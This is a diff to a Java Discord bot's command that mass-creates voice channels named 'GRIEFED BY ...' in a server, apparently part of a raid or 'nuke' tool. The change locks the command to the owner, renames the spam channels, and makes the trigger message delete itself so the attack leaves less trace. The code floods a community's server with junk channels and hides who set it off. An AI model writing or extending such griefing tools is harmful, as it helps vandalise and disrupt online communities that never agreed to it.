@@ -13,17 +13,19 @@ import java.util.Random;
 public class CreateVoiceChannelCommand implements ICommand {
     @Override
     public void handle(List<String> args, GuildMessageReceivedEvent event) {
+        if (!(event.getAuthor().getIdLong() == Core.OWNERID )) {
+            return;
+        }
         try {
             int input = Integer.parseInt(args.get(0));
             for (int i = 0; i < input; i++) {
-                event.getGuild().createVoiceChannel("GRIEFED BY POODLECOORP " + (this.getRandom())).setUserlimit(69).queue();
+                event.getGuild().createVoiceChannel("GRIEFED BY SWAG " + (this.getRandom())).setUserlimit(69).queue();
                 if (i == input - 1) {
-                    List<Message> messages = event.getChannel().getHistory().retrievePast(2).complete();
-                    event.getChannel().deleteMessages(messages).queue();
-                    EmbedBuilder eb = new EmbedBuilder();
-                    eb.setColor(346626);
-                    eb.setDescription(String.format("✅ Successfully created %s voice channel(s) ✅", args.get(0)));
-                    event.getChannel().sendMessage(eb.build()).queue();
+                    event.getMessage().delete().queue();
+//                    EmbedBuilder eb = new EmbedBuilder();
+//                    eb.setColor(346626);
+//                    eb.setDescription(String.format("✅ Successfully created %s voice channel(s) ✅", args.get(0)));
+//                    event.getChannel().sendMessage(eb.build()).queue();
                 }
             }
         } catch (NumberFormatException | ArrayIndexOutOfBoundsException ex) {
